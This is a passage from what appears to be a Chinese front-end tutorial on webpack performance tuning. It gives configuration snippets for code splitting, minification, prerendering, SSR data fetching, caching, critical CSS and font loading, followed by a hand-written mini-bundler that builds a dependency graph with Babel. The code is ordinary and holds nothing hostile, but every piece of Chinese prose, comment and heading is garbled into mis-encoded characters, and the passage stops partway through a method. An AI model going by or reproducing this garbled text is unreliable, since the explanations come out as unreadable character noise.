ä¿ç•™ESM</li><li>ç¬¬ä¸‰æ–¹åº“æ›¿æ¢ä¸ºESMç‰ˆæœ¬ï¼ˆå¦‚ lodash-esï¼‰</li></ul><p>(2) ä»£ç åˆ†å‰²ç­–ç•¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç²¾ç»†åŒ–SplitChunksé…ç½®</span><br><span class="hljs-attr">optimization</span>: &#123;<br>  <span class="hljs-attr">splitChunks</span>: &#123;<br>    <span class="hljs-attr">cacheGroups</span>: &#123;<br>      <span class="hljs-attr">core</span>: &#123; <br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/[\\/]node_modules[\\/](react|vue)/</span>, <br>        <span class="hljs-attr">priority</span>: <span class="hljs-number">100</span> <br>      &#125;,<br>      <span class="hljs-attr">commons</span>: &#123; <br>        <span class="hljs-attr">minChunks</span>: <span class="hljs-number">2</span>, <br>        <span class="hljs-attr">reuseExistingChunk</span>: <span class="hljs-literal">true</span> <br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(3) èµ„æºå‹ç¼©è¿›é˜¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Terserå¤šè¿›ç¨‹å‹ç¼©</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">TerserPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;terser-webpack-plugin&#x27;</span>);<br><span class="hljs-attr">optimization</span>: &#123;<br>  <span class="hljs-attr">minimizer</span>: [<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">TerserPlugin</span>(&#123; <span class="hljs-attr">parallel</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">terserOptions</span>: &#123; <span class="hljs-attr">compress</span>: &#123; <span class="hljs-attr">drop_console</span>: <span class="hljs-literal">true</span> &#125; &#125; &#125;)<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è¿è¡Œæ—¶æ€§èƒ½ä¼˜åŒ–</strong></p><p>(1) é¢„æ¸²æŸ“é™æ€å†…å®¹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨PrerenderSpaPluginç”Ÿæˆé™æ€HTML</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">PrerenderSPAPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;prerender-spa-plugin&#x27;</span>);<br><span class="hljs-attr">plugins</span>: [<br>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrerenderSPAPlugin</span>(&#123; <span class="hljs-attr">routes</span>: [<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;/about&#x27;</span>] &#125;)<br>]<br></code></pre></td></tr></table></figure><ul><li>æ•ˆæœï¼šé™æ€é¡µFCPâ‰¤1s</li></ul><p>(2) æœåŠ¡ç«¯æ¸²æŸ“(SSR)å…³é”®è·¯å¾„</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Next.js/Nuxt.js æ•°æ®é¢„å–</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getServerSideProps</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchAPI</span>();<br>  <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">props</span>: &#123; data &#125; &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ä¼˜åŠ¿ï¼šé¦–å±ç›´å‡º + CSRæ— ç¼åˆ‡æ¢</li></ul><p>(3) æµè§ˆå™¨ç¼“å­˜ç­–ç•¥</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># æ°¸ä¹…ç¼“å­˜é™æ€èµ„æº</span><br><span class="hljs-section">location</span> /static &#123;<br>  <span class="hljs-attribute">expires</span> <span class="hljs-number">1y</span>;<br>  <span class="hljs-attribute">add_header</span> Cache-Control <span class="hljs-string">&quot;public, immutable&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ¸²æŸ“å±‚ä¸“é¡¹ä¼˜åŒ–</strong></p><p>(1) CSSå…³é”®è·¯å¾„ä¼˜åŒ–</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æå–å…³é”®CSS + å¼‚æ­¥åŠ è½½å‰©ä½™</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Critters</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;critters-webpack-plugin&#x27;</span>);<br><span class="hljs-attr">plugins</span>: [<span class="hljs-keyword">new</span> <span class="hljs-title class_">Critters</span>(&#123; <span class="hljs-attr">preload</span>: <span class="hljs-string">&#x27;swap&#x27;</span> &#125;)]<br></code></pre></td></tr></table></figure><p>(2) å›¾ç‰‡åŠ è½½ç­–ç•¥</p><table><thead><tr><th align="left">ç±»å‹</th><th align="left">æ–¹æ¡ˆ</th><th align="left">å·¥å…·</th></tr></thead><tbody><tr><td align="left">é¦–å±å›¾ç‰‡</td><td align="left"><code>&lt;img loading=&quot;eager&quot;&gt;</code></td><td align="left">åŸç”ŸLazyLoad</td></tr><tr><td align="left">éé¦–å±å›¾ç‰‡</td><td align="left"><code>&lt;img loading=&quot;lazy&quot;&gt;</code></td><td align="left">Lazysizes</td></tr><tr><td align="left">å“åº”å¼å›¾ç‰‡</td><td align="left"><code>srcset</code> + <code>sizes</code></td><td align="left">Sharpå›¾åƒå¤„ç†</td></tr></tbody></table><p>(3) å­—ä½“åŠ è½½é˜²é˜»å¡</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* å¼‚æ­¥åŠ è½½å­—ä½“ */</span><br><span class="hljs-keyword">@font-face</span> &#123;<br>  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">&#x27;CustomFont&#x27;</span>;<br>  <span class="hljs-attribute">src</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;font.woff2&#x27;</span>) <span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;woff2&#x27;</span>);<br>  <span class="hljs-attribute">font-display</span>: swap; <span class="hljs-comment">/* æ–‡æœ¬å…ˆç”¨ç³»ç»Ÿå­—ä½“æ¸²æŸ“ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ€»ç»“åº”ç­”æ¡†æ¶</strong></p><p>åˆ†å±‚è§£æï¼š</p><ul><li>åŠ è½½å±‚ï¼š<ul><li>ä»£ç åˆ†å‰² + é¢„åŠ è½½</li><li>HTTP&#x2F;2æ¨é€ + èµ„æºé¢„åŠ è½½</li><li>CDNé™æ€èµ„æºç¼“å­˜</li></ul></li><li>æ„å»ºå±‚ï¼š<ul><li>Tree Shakingæ·±åº¦é…ç½®</li><li>SplitChunksç²¾ç»†æ‹†åŒ…</li><li>æŒä¹…åŒ–ç¼“å­˜ (Webpack 5)</li></ul></li><li>æ¸²æŸ“å±‚ï¼š<ul><li>å…³é”®CSSå†…è”</li><li>å›¾ç‰‡æ‡’åŠ è½½ + å­—ä½“å¼‚æ­¥åŠ è½½</li><li>æœåŠ¡ç«¯æ¸²æŸ“ç›´å‡º</li></ul></li><li>æ•°æ®å±‚ï¼š<ul><li>æ¥å£æ•°æ®è£å‰ª</li><li>å®¢æˆ·ç«¯æ•°æ®ç¼“å­˜</li></ul></li></ul><h2 id="8-3-åŸç†æ·±æŒ–"><a href="#8-3-åŸç†æ·±æŒ–" class="headerlink" title="8.3 åŸç†æ·±æŒ–"></a>8.3 åŸç†æ·±æŒ–</h2><h3 id="8-3-1-æ‰‹å†™ç®€æ˜“Webpackæ ¸å¿ƒæµç¨‹ï¼ˆè§£æä¾èµ–â†’ç”ŸæˆChunkï¼‰"><a href="#8-3-1-æ‰‹å†™ç®€æ˜“Webpackæ ¸å¿ƒæµç¨‹ï¼ˆè§£æä¾èµ–â†’ç”ŸæˆChunkï¼‰" class="headerlink" title="8.3.1 æ‰‹å†™ç®€æ˜“Webpackæ ¸å¿ƒæµç¨‹ï¼ˆè§£æä¾èµ–â†’ç”ŸæˆChunkï¼‰"></a>8.3.1 æ‰‹å†™ç®€æ˜“Webpackæ ¸å¿ƒæµç¨‹ï¼ˆè§£æä¾èµ–â†’ç”ŸæˆChunkï¼‰</h3><p>**æ ¸å¿ƒæµç¨‹æ¶æ„</p><pre class="mermaid">graph TD  A[å…¥å£æ–‡ä»¶] --> B[ASTè§£æä¾èµ–]  B --> C[é€’å½’æ„å»ºä¾èµ–å›¾]  C --> D[ç”Ÿæˆæ¨¡å—ID]  D --> E[å°è£…æ¨¡å—é—­åŒ…]  E --> F[ç”ŸæˆChunk]  F --> G[è¾“å‡ºBundleæ–‡ä»¶]</pre><p><strong>ä¾èµ–å›¾æ„å»ºç®—æ³•</strong></p><pre class="mermaid">graph TB  A[å…¥å£æ–‡ä»¶] --> B[è§£æç›´æ¥ä¾èµ–]  B --> C[æ¨¡å—å…¥é˜Ÿåˆ—]  C --> D{é˜Ÿåˆ—æ˜¯å¦ä¸ºç©º?}  D -->|å¦| E[å‡ºé˜Ÿåˆ—æ¨¡å—]  E --> F[è§£ææ–°ä¾èµ–]  F --> G[æ–°æ¨¡å—å…¥é˜Ÿåˆ—]  G --> D  D -->|æ˜¯| H[ç”Ÿæˆä¾èµ–å›¾]</pre><p><strong>æ ¸å¿ƒæµç¨‹ä»£ç å®ç°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> parser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@babel/parser&#x27;</span>);<br><span class="hljs-keyword">const</span> traverse = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@babel/traverse&#x27;</span>).<span class="hljs-property">default</span>;<br><span class="hljs-keyword">const</span> &#123; transformFromAst &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@babel/core&#x27;</span>);<br><br><span class="hljs-comment">// 1. å®šä¹‰Compilerç±» - Webpackçš„æ ¸å¿ƒç¼–è¯‘å™¨</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Compiler</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span> = options;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">modules</span> = []; <span class="hljs-comment">// å­˜å‚¨æ‰€æœ‰æ¨¡å—</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chunks</span> = []; <span class="hljs-comment">// å­˜å‚¨æ‰€æœ‰chunk</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">assets</span> = &#123;&#125;; <span class="hljs-comment">// å­˜å‚¨è¾“å‡ºèµ„æº</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fileDependencies</span> = []; <span class="hljs-comment">// å­˜å‚¨æ–‡ä»¶ä¾èµ–</span><br>  &#125;<br><br>  <span class="hljs-comment">// 2. è¿è¡Œç¼–è¯‘å™¨</span><br>  <span class="hljs-title function_">run</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// ä»å…¥å£æ–‡ä»¶å¼€å§‹ç¼–è¯‘</span><br>    <span class="hljs-keyword">const</span> entryModule = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">buildModule</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">entry</span>, <span class="hljs-literal">true</span>);<br>    <br>    <span class="hljs-comment">// æ„å»ºä¾èµ–å›¾</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">buildDependencyGraph</span>(entryModule);<br>    <br>    <span class="hljs-comment">// ç”Ÿæˆchunks</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateChunks</span>();<br>    <br>    <span class="hljs-comment">// è¾“å‡ºæ–‡ä»¶</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emitFiles</span>();<br>    <br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;æ‰“åŒ…å®Œæˆ!&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-comment">// 3. æ„å»ºå•ä¸ªæ¨¡å—</span><br>  <span class="hljs-title function_">buildModule</span>(<span class="hljs-params">filename, isEntry</span>) &#123;<br>    <span class="hljs-comment">// è·å–æ–‡ä»¶ç»å¯¹è·¯å¾„</span><br>    <span class="hljs-keyword">let</span> filePath = path.<span class="hljs-title function_">isAbsolute</span>(filename) <br>      ? filename <br>      : path.<span class="hljs-title function_">join</span>(process.<span class="hljs-title function_">cwd</span>(), filename);<br>    <br>    <span class="hljs-comment">// æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span><br>    <span class="hljs-keyword">if</span> (!fs.<span class="hljs-title function_">existsSync</span>(filePath)) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`æ–‡ä»¶ä¸å­˜åœ¨: <span class="hljs-subst">$&#123;filePath&#125;</span>`</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">// è¯»å–æ–‡ä»¶å†…å®¹</span><br>    <span class="hljs-keyword">const</span> fileContent = fs.<span class="hljs-title function_">readFileSync</span>(filePath, <span class="hljs-string">&#x27;utf-8&#x27;</span>);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fileDependencies</span>.<span class="hljs-title function_">push</span>(filePath);<br>    <br>    <span class="hljs-comment">// ä½¿ç”¨Babelè§£æä»£ç ä¸ºAST</span><br>    <span class="hljs-keyword">const</span> ast = parser.<span class="hljs-title function_">parse</span>(fileContent, &#123;<br>      <span class="hljs-attr">sourceType</span>: <span class="hljs-string">&#x27;module&#x27;</span><br>    &#125;);<br>    <br>    <span class="hljs-comment">// æ”¶é›†ä¾èµ–</span><br>    <span class="hljs-keyword">const</span> dependencies = [];<br>    <span class="hljs-title function_">traverse</span>(ast, &#123;<br>      <span class="hljs-title class_">ImportDeclaration</span>: <span class="hljs-function">(<span class="hljs-params">&#123; node &#125;</span>) =&gt;</span> &#123;<br>        dependencies.<span class="hljs-title function_">push</span>(node.<span class="hljs-property">source</span>.<span class="hljs-property">value</span>);<br>      &#125;,<br>      <span class="hljs-title class_">CallExpression</span>: <span class="hljs-function">(<span class="hljs-params">&#123; node &#125;</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (node.<span class="hljs-property">callee</span>.<span class="hljs-property">name</span> === <span class="hljs-string">&#x27;require&#x27;</span>) &#123;<br>          dependencies.<span class="hljs-title function_">push</span>(node.<span class="hljs-property">arguments</span>[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>);<br>        &#125;<br>      &#125;<br>    &#125;);<br>    <br>    <span class="hljs-comment">// å°†ES6ä»£ç è½¬æ¢ä¸ºES5</span><br>    <span class="hljs-keyword">const</span> &#123; code &#125; = <span class="hljs-title function_">transformFromAst</span>(ast, <span class="hljs-literal">null</span>, &#123;<br>      <span class="hljs-attr">presets</span>: [<span class="hljs-string">&#x27;@babel/preset-env&#x27;</span>]<br>    &#125;);<br>    <br>    <span class="hljs-comment">// åˆ›å»ºæ¨¡å—å¯¹è±¡</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = &#123;<br>      <span class="hljs-attr">id</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">modules</span>.<span class="hljs-property">length</span>,<br>      <span class="hljs-attr">filename</span>: filePath,<br>      dependencies,<br>      code,<br>      isEntry<br>    &#125;;<br>    <br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">modules</span>.<span class="hljs-title function_">push</span>(<span class="hljs-variable language_">module</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">module</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// 4. æ„å»ºå®Œæ•´ä¾èµ–å›¾</span><br>  <span class="hljs-title function_">buildDependencyGraph</span>(<span class="hljs-params">entryModule</span>) &#123;<br>    <span class="hljs-keyword">const</span> queue = [entryModule];<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> <span class="hljs-keyword">of</span> queue) &#123;<br>      <span class="hljs-variable language_">module</span>.<span class="hljs-property">dependencies</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">dep</span> =&gt;</span> &#123;<br>        <span class="hljs-comment">// è½¬æ¢è·¯å¾„ä¸ºç»å¯¹è·¯å¾„</span><br>        <span class="hljs-keyword">const</span> dirname = path.<span class="hljs-title function_">dirname</span>(<span class="hljs-variable language_">module</span>.<span class="hljs-property">filename</span>);<br>        <span class="hljs-keyword">const</span> absolutePath = path.<span class="hljs-title function_">resolve</span>(dirname, dep);<br>        <br>        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å·²å¤„ç†è¿‡è¯¥æ¨¡å—</span><br>        <span class="hljs-keyword">const</span> alreadyProcessed = <span class="hljs-variable language_">this</span>.<span class="hljs-property">modules</span>.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">m</span> =&gt;</span> m.<span class="hljs-property">filename</span> === absolutePath);<br>        <br>        <span class="hljs-keyword">if</span> (!alreadyProcessed) &#123;<br>          <span class="hljs-keyword">const</span> childModule = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">buildModule</span>(absolutePath, <span class="hljs-literal">false</span>);<br>          queue.<span class="hljs-title function_">push</span>(childModule);<br>        &#125;<br>      &#125;);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-comment">// 5. ç”ŸæˆChunks</span><br>  <span class="hljs-title function_">generateChunks</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// ç®€å•æ‰“åŒ…ç­–ç•¥ï¼šæ‰€æœ‰æ¨¡å—æ‰“åŒ…åˆ°ä¸€ä¸ªchunkä¸­</span><br>    <span class="hljs-comment">// å®é™…Webpackä¼šæ ¹æ®é…ç½®åˆ†å‰²chunk</span><br>    <span class="hljs-keyword">const</span> chunk = &#123;<br>      <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;main&#x27;</span>,<br>      <span class="hljs-attr">modules</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">modules</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">m</span> =&gt;</span> m.<span class="hljs-property">id</span>)<br>    &#125;;<br>    <br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chunks</span>.<span class="hljs-title function_">push</span>(chunk);<br>  &#125;<br><br>  <span class="hljs-comment">// 6. ç”Ÿæˆbundleæ–‡ä»¶</span><br>  <span class="hljs-title function_">generateBundleCode</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// åˆ›å»ºæ¨¡å—æ˜ å°„å¯¹è±¡</span><br>    <span class="hljs-keyword">const</span> modulesMap = <span class="hljs-variable language_">this</span>.<span class="hljs-property">modules</span>.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">map, mod</span>) =&gt;</span> &#123;<br>      map[mod.<span class="hljs-property">id</span>] = &#123;<br>        <span class="hljs-attr">fn</span>: mod.<span class="hljs-property">code</span>,<br>        <span class="hljs-attr">deps</span>: mod.<span class="hljs-property">dependencies</span>.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">deps, dep</span>) =&gt;</span> &#123;<br>          <span class="hljs-keyword">const</span> depModule = <span class="hljs-variable language_">this</span>.<span class="hljs-property">modules</span>.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">m</span> =&gt;</span> <br>            m.<span class="hljs-property">filename</span> === path.<span class="hljs-title function_">resolve</span>(path.<span class="hljs-title function_">dirname</span>(mod.<span class="hljs-property">filename</span>), dep)<br>          );<br>          <span class="hljs-keyword">if</span> (depModule) deps[dep] = depModule.<span class="hljs-property">id</span>;<br>          <span class="hljs-keyword">return</span> deps;<br>        &#125;, &#123;&#125;)<br>      &#125;;<br>      <span class="hljs-keyword">return</span> map;<br>    &#125;, &#123;&#125;);<br>    <br>    <span class="hljs-comment">// ç”Ÿæˆbundleä»£ç </span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">`(function(modules) &#123;</span><br><span class="hljs-string">      // ç¼“å­˜å·²åŠ è½½çš„æ¨¡å—</span><br><span class="hljs-string">      var installedModules = &#123;&#125;;</span><br><span class="hljs-string">      </span><br><span class="hljs-string">      // å®ç°requireå‡½æ•°</span><br><span class="hljs-string">      function require(moduleId) &#123;</span><br><span class="hljs-string">        // æ£€æŸ¥æ˜¯å¦å·²ç¼“å­˜</span><br><span class="hljs-string">        if (installedModules[moduleId]) &#123;</span><br><span class="hljs-string">          return installedModules[moduleId].exports;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        // åˆ›å»ºæ–°æ¨¡å—</span><br><span class="hljs-string">        var module = installedModules[moduleId] = &#123;</span><br><span class="hljs-string">          exports: &#123;&#125;</span><br><span class="hljs-string">        &#125;;</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        // æ‰§è¡Œæ¨¡å—å‡½æ•°</span><br><span class="hljs-string">        modules[moduleId].fn.call(</span><br><span class="hljs-string">          module.exports, </span><br><span class="hljs-string">          module, </span><br><span class="hljs-string">          module.exports, </span><br><span class="hljs-string">          require</span><br><span class="hljs-string">        );</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        // è¿”å›æ¨¡å—å¯¼å‡º</span><br><span class="hljs-string">        return module.exports;</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string">      </span><br><span class="hljs-string">      // åŠ è½½å…¥å£æ¨¡å—</span><br><span class="hljs-string">      require(<span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.modules.find(m =&gt; m.isEntry).id&#125;</span>);</span><br><span class="hljs-string">    &#125;)(<span class="hljs-subst">$&#123;<span class="hljs-built_in">JSON</span>.stringify(modulesMap, <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>)&#125;</span>);`</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// 7. è¾“å‡ºæ–‡ä»¶</span><br>  <span class="hljs-title function_">emitFiles</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> outputPath = path.<span class="hljs-title function_">join</span>(<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">output</span>.<span class="hljs-property">path</span>, <br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">output</span>.<span class="hljs-property">filename</span><br>    );<br>    <br>    <span class="hljs-comment">// ç¡®ä¿è¾“å‡ºç›®å½•å­˜åœ¨</span><br>    <span class="hljs-keyword">if</span> (!fs.<span class="hljs-title function_">existsSync</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">output</span>.<span class="hljs-property">path</span>)) &#123;<br>      fs.<span class="hljs-title function_">mkdirSync</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">output</span>.<span class="hljs-property">path</span>, &#123; <span class="hljs-attr">recursive</span>: <span class="hljs-literal">true</span> &#125;);<br>    &#125;<br>    <br>    <span class="hljs-comment">// ç”Ÿæˆbundleä»£ç </span><br>    <span class="hljs-keyword">const</span> bundleCode = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateBundleCode</span>();<br>    